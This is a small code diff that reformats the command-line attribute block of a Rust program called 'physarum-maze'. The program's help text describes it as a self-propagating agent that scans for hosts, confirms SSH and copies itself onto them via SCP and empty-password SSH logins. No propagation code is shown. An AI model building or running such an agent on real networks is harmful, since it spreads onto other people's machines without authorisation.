@@ -16,8 +16,8 @@ pub enum Mode {
 
 #[derive(Parser, Debug)]
 #[command(
-    name    = "physarum-maze",
-    about   = "PF-1 self-propagating maze agent (physarum slime-mould model)",
+    name = "physarum-maze",
+    about = "PF-1 self-propagating maze agent (physarum slime-mould model)",
     long_about = "Listens for ICMP echo requests (eBPF-inspired raw socket stimulus), \
                   confirms SSH on discovered hosts, and propagates itself via SCP + \
                   empty-password SSH.  Maintains a lineage JSON with D_ij path scores."
